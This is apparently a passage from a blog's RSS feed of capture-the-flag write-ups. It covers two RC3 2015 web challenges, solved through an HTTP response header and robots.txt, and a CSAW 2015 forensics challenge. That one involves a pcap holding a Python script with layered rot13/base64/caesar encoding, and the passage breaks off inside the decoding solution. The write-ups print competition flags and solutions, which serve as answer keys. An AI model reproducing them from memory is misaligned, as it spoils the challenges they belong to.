&lt;p&gt;Everything looks normal there. Now let’s look at the &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/Goal/response&quot;&gt;response&lt;/a&gt; from the web server.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/Goal/Response.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/Goal/Response.png&quot; alt=&quot;Response&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;HTTP/1.1 200 OK
Date: Sat, 21 Nov 2015 20:07:23 GMT
Server: Apache
Flag: RC3-SOCCER-8675309
Vary: Accept-Encoding
Content-Length: 95
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

&amp;lt;html&amp;gt;
&amp;lt;title&amp;gt;GOOOOOAAAAALLLLLLLL!!!!!!!!!1&amp;lt;/title&amp;gt;

&amp;lt;img src=&quot;goal.gif&quot; alt=&quot;goal&quot;/&amp;gt;

&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We see something very interesting here. There’s a section called “Flag” with the value: RC3-SOCCER-8675309.  Finally we have the flag: &lt;strong&gt;RC3-SOCCER-8675309&lt;/strong&gt;&lt;/p&gt;
</description>
        <pubDate>Fri, 27 Nov 2015 21:59:33 -0800</pubDate>
        <link>/blog/web/ctf/all/goal</link>
        <guid isPermaLink="true">/blog/web/ctf/all/goal</guid>
        
        <category>web</category>
        
        <category>CTF</category>
        
        <category>RC3</category>
        
        
        <category>Web</category>
        
        <category>CTF</category>
        
        <category>All</category>
        
      </item>
    
      <item>
        <title>RC3 2015 ~ v1ew-s0urce: Web 50</title>
        <description>&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/Start.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/Start.png&quot; alt=&quot;Start&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This a baby CTF question. It was very simple. We are given a link: &lt;a href=&quot;http://129.21.39.225:81/&quot;&gt;http://129.21.39.225:81/&lt;/a&gt;. Upon visiting the site we are greeted with a simple text&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;nothing to see here..&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Now look at the title of the web page.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/bots.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/bots.png&quot; alt=&quot;bots&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;It says Go away bots! This means they don’t want a web crawler to be at this website. If you guys know basic web, the way you keep web crawlers from visiting certain web pages is to write it in the &lt;strong&gt;robots.txt&lt;/strong&gt; file.&lt;/p&gt;

&lt;p&gt;Let’s visit &lt;a href=&quot;http://129.21.39.225:81/robots.txt&quot;&gt;http://129.21.39.225:81/robots.txt&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/assets/rc3/robots.txt&quot;&gt;robots.txt&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#Now those silly bots can&#39;t crawl my site :3

User-agent: *
Disallow: /admin/
Disallow: /secret/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This means they don’t want the web page to visit /admin or /secret.&lt;/p&gt;

&lt;p&gt;Let’s visit &lt;a href=&quot;http://129.21.39.225:81/secret&quot;&gt;http://129.21.39.225:81/secret&lt;/a&gt; too&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/flag.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/flag.png&quot; alt=&quot;flag&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now we have the flag:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;RC3-ROBOTZ-559672&lt;/strong&gt;&lt;/p&gt;
</description>
        <pubDate>Fri, 27 Nov 2015 20:59:33 -0800</pubDate>
        <link>/blog/ctf/web/all/v1ew-s0urce</link>
        <guid isPermaLink="true">/blog/ctf/web/all/v1ew-s0urce</guid>
        
        <category>RC3</category>
        
        <category>Forensics</category>
        
        <category>CTF</category>
        
        
        <category>CTF</category>
        
        <category>Web</category>
        
        <category>All</category>
        
      </item>
    
      <item>
        <title>CSAW 2015 ~ Transfer: Forensics 100</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;I was sniffing some web traffic for a while, I think i finally got something interesting. 
Help me find flag through all these packets.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/assets/csaw/net_756d631588cb0a400cc16d1848a5f0fb.pcap&quot;&gt;net_756d631588cb0a400cc16d1848a5f0fb.pcap&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This was a fairly easy forensics question, although it could of easily been worth 150 considering how much easier the other forensics ones were. It combined a packet capture with some python programming for basic cryptographic ciphers.&lt;/p&gt;

&lt;p&gt;We given a link to a pcap file: &lt;a href=&quot;https://viviturtle.github.io/assets/csaw/net_756d631588cb0a400cc16d1848a5f0fb.pcap&quot;&gt;net_756d631588cb0a400cc16d1848a5f0fb.pcap&lt;/a&gt;. Thinking it would be quite easy, I strings the pcap file looking for “flag”&lt;/p&gt;

&lt;blockquote&gt;
  &lt;table&gt;
    &lt;tbody&gt;
      &lt;tr&gt;
        &lt;td&gt;strings net_756d631588cb0a400cc16d1848a5f0fb.pcap&lt;/td&gt;
        &lt;td&gt;grep flag&lt;/td&gt;
      &lt;/tr&gt;
    &lt;/tbody&gt;
  &lt;/table&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;table&gt;
    &lt;tbody&gt;
      &lt;tr&gt;
        &lt;td&gt;xxd net_756d631588cb0a400cc16d1848a5f0fb.pcap&lt;/td&gt;
        &lt;td&gt;grep flag&lt;/td&gt;
      &lt;/tr&gt;
    &lt;/tbody&gt;
  &lt;/table&gt;
&lt;/blockquote&gt;

&lt;p&gt;All we got was&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;After that didn’t work, I inspected it in wireshark, our great packet inspection tool, and was given a huge list of packets(2000 to be exact).I spent some time following several TCP streams (right click packet -&amp;gt; Follow TCP Stream) and we can see the packets included traffic from reddit, facebook and symantec to name a few.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/csaw/Example.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/csaw/Example.png&quot; alt=&quot;Example&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;When we get to packets 150-300ish, we see something very interesting.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/csaw/Python.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/csaw//Python.png&quot; alt=&quot;Python&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We can clearly see the flag is somewhere in there, so I saved the file on my pc.
After dissecting what this is, it is clearly python code in which some “flag” was encrypted with caesar ciphers, rot13, and base64, all of which are broken.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/assets/csaw/net_original.py&quot;&gt;net_original.py&lt;/a&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;random&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;FLAG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}&#39;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;enc_ciphers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;rot13&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;b64e&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;caesar&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# dec_ciphers = [&#39;rot13&#39;, &#39;b64d&#39;, &#39;caesard&#39;]&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rot13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;_rot13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;maketrans&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; 
    	&lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    	&lt;span class=&quot;s&quot;&gt;&quot;NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;translate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_rot13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;b64e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;caesar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plaintext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shift&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;alphabet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ascii_lowercase&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;shifted_alphabet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;alphabet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shift&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;alphabet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shift&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;maketrans&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;alphabet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shifted_alphabet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plaintext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;translate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;2{}&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;choice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc_ciphers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enc_ciphers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;_tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;globals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;{}{}&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FLAG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;What this script did was loop through a certain unknown amount of iterations and randomly chose a cipher to apply whether it was base64, caesar or rot13.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;enc_ciphers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;rot13&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;b64e&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;caesar&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FLAG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#encode...&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;choice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc_ciphers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#...&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;_tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;globals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;For those of you new to cryptography, caesar cipher is a simple shift of characters. In this case the default value was 3, so “A” would become “D” and “B” would be come “E”. Rot13 is pretty much the same thing but with 13 letters. Lastly, Base64 is just a way of encoding data to use the full alphabet from a-z, A-Z and 0-1, and a few punctuations. In this way data can be represented not just with A-Z and A-F (Hexadecmial) or just ASCII.&lt;/p&gt;

&lt;p&gt;After it was applied, it appended the index+1 of the cipher in enc_ciphers to signify which cipher was done&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;enc_ciphers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;rot13&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;b64e&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;caesar&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enc_ciphers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#...&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;{}{}&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;From this code we clearly see what we have to do is take the first integer of the output (which is the long string after the print), subtract one, and apply the decryption cipers (which we had to make) based on that integer. We can keep doing this until the final string contains the word flag. The following code is my final code to get the flag.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/assets/csaw/net_solution.py&quot;&gt;net_solution.py&lt;/a&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;random&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;ciph&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&#39;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;dec_ciphers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;rot13&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;b64d&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;caesard&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rot13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;_rot13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;maketrans&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; 
    	&lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    	&lt;span class=&quot;s&quot;&gt;&quot;NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;translate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_rot13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;b64d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
